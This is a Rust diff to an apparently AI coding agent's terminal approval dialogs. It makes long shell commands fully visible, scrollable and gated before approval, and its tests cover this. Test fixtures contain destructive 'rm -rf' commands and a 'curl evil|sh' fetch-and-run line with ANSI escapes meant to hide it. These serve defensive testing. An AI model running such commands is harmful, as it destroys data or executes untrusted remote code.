@@ -903,32 +903,7 @@ fn draw_browse_approval(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
         return;
     };
 
-    let popup_w = (area.width * 6 / 10).max(50).min(area.width);
-    let popup_h = 12_u16.min(area.height);
-    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
-    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
-    let popup = Rect {
-        x,
-        y,
-        width: popup_w,
-        height: popup_h,
-    };
-
-    f.render_widget(Clear, popup);
-
-    let block = Block::default()
-        .borders(Borders::ALL)
-        .border_style(Style::default().fg(Color::Yellow))
-        .title(Span::styled(
-            " Browse Approval ",
-            Style::default()
-                .fg(Color::Yellow)
-                .add_modifier(Modifier::BOLD),
-        ));
-    let inner = block.inner(popup);
-    f.render_widget(block, popup);
-
-    let mut lines = vec![
+    let lines = vec![
         Line::raw(""),
         Line::from(Span::styled(
             "  ⚠ Browse approval required",
@@ -953,9 +928,8 @@ fn draw_browse_approval(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
             format!("  Reason:  {}", prompt.reason),
             Style::default().fg(Color::White),
         )),
-        Line::raw(""),
     ];
-    lines.push(Line::from(vec![
+    let legend = Line::from(vec![
         Span::styled("  [", Style::default().fg(Color::DarkGray)),
         Span::styled(
             "A",
@@ -969,31 +943,79 @@ fn draw_browse_approval(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
             Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
         ),
         Span::styled("]eny", Style::default().fg(Color::DarkGray)),
-    ]));
+    ]);
+    let para = Paragraph::new(Text::from(lines)).wrap(Wrap { trim: true });
 
-    f.render_widget(
-        Paragraph::new(Text::from(lines)).wrap(Wrap { trim: true }),
-        inner,
-    );
+    let popup_w = (area.width * 6 / 10).max(50).min(area.width);
+    // Sized to the wrapped text: a fixed height let a long target, URL or
+    // reason push the later fields and the legend out of view.
+    let body_rows =
+        u16::try_from(para.line_count(popup_w.saturating_sub(2).max(1))).unwrap_or(u16::MAX);
+    // 2 borders + spacer + legend.
+    let popup_h = body_rows.saturating_add(4).max(12).min(area.height);
+    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
+    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
+    let popup = Rect {
+        x,
+        y,
+        width: popup_w,
+        height: popup_h,
+    };
+
+    f.render_widget(Clear, popup);
+
+    let block = Block::default()
+        .borders(Borders::ALL)
+        .border_style(Style::default().fg(Color::Yellow))
+        .title(Span::styled(
+            " Browse Approval ",
+            Style::default()
+                .fg(Color::Yellow)
+                .add_modifier(Modifier::BOLD),
+        ));
+    let inner = block.inner(popup);
+    f.render_widget(block, popup);
+
+    // Legend pinned to the bottom row, like the permission dialog.
+    let legend_h = 1.min(inner.height);
+    let body = Rect {
+        height: inner.height.saturating_sub(legend_h + 1),
+        ..inner
+    };
+    let legend_area = Rect {
+        y: inner.y + inner.height.saturating_sub(legend_h),
+        height: legend_h,
+        ..inner
+    };
+    f.render_widget(para, body);
+    f.render_widget(Paragraph::new(legend), legend_area);
 }
 
 // ── Permission dialog ─────────────────────────────────────────────────────────
 
-fn draw_permission(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
-    let Some(perm) = &app.pending_permission else {
+fn draw_permission(f: &mut Frame, area: Rect, app: &mut App, tc: ThemeColors) {
+    let Some(perm) = &mut app.pending_permission else {
         return;
     };
 
+    let mut lines = vec![Line::raw("")];
+    for dl in perm.description.lines() {
+        lines.push(Line::from(Span::styled(
+            format!("  {dl}"),
+            Style::default().fg(Color::White),
+        )));
+    }
+    // trim: false keeps the command's own indentation when it wraps.
+    let para = Paragraph::new(Text::from(lines)).wrap(Wrap { trim: false });
+
     let popup_w = (area.width * 7 / 10).max(50).min(area.width);
-    // Height counts *wrapped* rows: sizing by `lines()` clipped a long
-    // one-line Bash command, hiding its tail and the [y]/[a]/[n] legend.
-    let text_w = popup_w.saturating_sub(2).max(1) as usize;
-    let desc_rows: usize = perm
-        .description
-        .lines()
-        .map(|l| (l.chars().count() + 2).div_ceil(text_w).max(1))
-        .sum();
-    let popup_h = (desc_rows as u16).saturating_add(5).max(8).min(area.height);
+    // Measure with the same Paragraph that is drawn: a character-count
+    // estimate ignores word wrapping, which pushes long path tokens down a
+    // row and silently cut off the tail of commands like `cp … && rm -rf …`.
+    let text_w = popup_w.saturating_sub(2).max(1);
+    let body_rows = u16::try_from(para.line_count(text_w)).unwrap_or(u16::MAX);
+    // 2 borders + spacer + legend.
+    let popup_h = body_rows.saturating_add(4).max(8).min(area.height);
     let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
     let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
     let popup = Rect {
@@ -1015,13 +1037,6 @@ fn draw_permission(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
     let inner = block.inner(popup);
     f.render_widget(block, popup);
 
-    let mut lines = vec![Line::raw("")];
-    for dl in perm.description.lines() {
-        lines.push(Line::from(Span::styled(
-            format!("  {dl}"),
-            Style::default().fg(Color::White),
-        )));
-    }
     // The legend is drawn pinned to the bottom row, so it stays visible even
     // when the command is taller than the screen.
     let legend = Line::from(vec![
@@ -1057,11 +1072,47 @@ fn draw_permission(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
         height: legend_h,
         ..inner
     };
-    // trim: false keeps the command's own indentation when it wraps.
-    f.render_widget(
-        Paragraph::new(Text::from(lines)).wrap(Wrap { trim: false }),
-        body,
-    );
+
+    if body_rows <= body.height {
+        perm.fully_shown = true;
+        f.render_widget(para, body);
+    } else {
+        // Taller than the screen: scroll instead of clipping, and keep the
+        // last body row for a marker so the cut is never silent.
+        let view_h = body.height.saturating_sub(1);
+        let max_scroll = body_rows - view_h;
+        perm.scroll = perm.scroll.min(max_scroll);
+        let below = max_scroll - perm.scroll;
+        if below == 0 && view_h > 0 {
+            perm.fully_shown = true;
+        }
+        f.render_widget(
+            para.scroll((perm.scroll, 0)),
+            Rect {
+                height: view_h,
+                ..body
+            },
+        );
+        let marker = if below > 0 {
+            Span::styled(
+                format!("  ↓ {below} more rows (↓/PgDn): read to allow"),
+                Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
+            )
+        } else {
+            Span::styled(
+                "  ── end of command (↑/PgUp scrolls back) ──",
+                Style::default().fg(Color::DarkGray),
+            )
+        };
+        f.render_widget(
+            Paragraph::new(Line::from(marker)),
+            Rect {
+                y: body.y + view_h,
+                height: body.height - view_h,
+                ..body
+            },
+        );
+    }
     f.render_widget(Paragraph::new(legend), legend_area);
 }
 
@@ -1250,21 +1301,11 @@ mod permission_popup_tests {
     use super::*;
     use ratatui::{Terminal, backend::TestBackend};
 
-    /// The user must see the whole command they approve, and the legend.
-    #[test]
-    fn long_command_and_legend_are_fully_visible() {
-        let cmd = format!("echo {} && rm -rf ./build-artifacts-TAIL", "x".repeat(300));
-        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
-        let (reply, _rx) = tokio::sync::oneshot::channel();
-        app.pending_permission = Some(crate::tui::app::PendingPermission {
-            tool_name: "Bash".into(),
-            description: format!("Run shell command:\n  {cmd}"),
-            reply,
-        });
-        let mut term = Terminal::new(TestBackend::new(100, 40)).unwrap();
+    fn render_permission(app: &mut crate::tui::app::App, w: u16, h: u16) -> (String, String) {
+        let mut term = Terminal::new(TestBackend::new(w, h)).unwrap();
         term.draw(|f| {
             let area = f.area();
-            draw_permission(f, area, &app, theme_colors("dark"));
+            draw_permission(f, area, app, theme_colors("dark"));
         })
         .unwrap();
         let buf = term.backend().buffer();
@@ -1280,8 +1321,69 @@ mod permission_popup_tests {
             .chars()
             .filter(|c| !c.is_whitespace() && *c != '│')
             .collect();
+        (screen, flat)
+    }
+
+    fn app_with_command(cmd: &str) -> crate::tui::app::App {
+        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
+        let (reply, _rx) = tokio::sync::oneshot::channel();
+        app.pending_permission = Some(crate::tui::app::PendingPermission {
+            tool_name: "Bash".into(),
+            description: format!("Run shell command:\n  {cmd}"),
+            reply,
+            scroll: 0,
+            fully_shown: false,
+        });
+        app
+    }
+
+    /// The user must see the whole command they approve, and the legend.
+    #[test]
+    fn long_command_and_legend_are_fully_visible() {
+        let cmd = format!("echo {} && rm -rf ./build-artifacts-TAIL", "x".repeat(300));
+        let mut app = app_with_command(&cmd);
+        let (screen, flat) = render_permission(&mut app, 100, 40);
         assert!(flat.contains("build-artifacts-TAIL"), "{screen}");
         assert!(screen.contains("] deny"), "{screen}");
+        assert!(app.pending_permission.unwrap().fully_shown);
+    }
+
+    /// Word wrapping moves whole path tokens down a row, so a char-count
+    /// estimate under-sized the popup and hid the `rm -rf` tail.
+    #[test]
+    fn word_wrapped_command_tail_is_visible() {
+        let p = "/home/user/projects/acme-platform/services/billing";
+        let cmd = format!(
+            "cp {p}/config/production.yaml {p}/backups/staging-backup.yaml && rm -rf {p}/data/ledger-archive-TAIL"
+        );
+        for w in [80, 100] {
+            let mut app = app_with_command(&cmd);
+            let (screen, flat) = render_permission(&mut app, w, 40);
+            assert!(flat.contains("ledger-archive-TAIL"), "w={w}\n{screen}");
+            assert!(screen.contains("] deny"), "w={w}\n{screen}");
+            assert!(app.pending_permission.unwrap().fully_shown, "w={w}");
+        }
+    }
+
+    /// A command taller than the terminal is never cut silently: a marker
+    /// says rows are hidden, y/a stay disabled until they were scrolled into
+    /// view, and the tail is reachable by scrolling.
+    #[test]
+    fn command_taller_than_screen_scrolls_and_gates_approval() {
+        let body: String = (0..30).map(|i| format!("line-{i}\n")).collect();
+        let cmd = format!("cat <<'EOF' > f\n{body}EOF\nrm -rf ./TAIL-DIR");
+        let mut app = app_with_command(&cmd);
+        let (screen, flat) = render_permission(&mut app, 100, 16);
+        assert!(screen.contains("more rows"), "{screen}");
+        assert!(!flat.contains("TAIL-DIR"), "{screen}");
+        assert!(screen.contains("] deny"), "{screen}");
+        assert!(!app.pending_permission.as_ref().unwrap().fully_shown);
+
+        app.pending_permission.as_mut().unwrap().scroll = u16::MAX;
+        let (screen, flat) = render_permission(&mut app, 100, 16);
+        assert!(flat.contains("TAIL-DIR"), "{screen}");
+        assert!(screen.contains("end of command"), "{screen}");
+        assert!(app.pending_permission.unwrap().fully_shown);
     }
 
     /// Raw ESC/BEL in the dialog or in chat must never reach the terminal:
@@ -1298,6 +1400,8 @@ mod permission_popup_tests {
             tool_name: "Bash".into(),
             description: "Run shell command:\n  curl evil|sh\x1b[2K\x1b[Gls\r".into(),
             reply,
+            scroll: 0,
+            fully_shown: false,
         });
         let mut term = Terminal::new(TestBackend::new(80, 30)).unwrap();
         term.draw(|f| draw(f, &mut app)).unwrap();
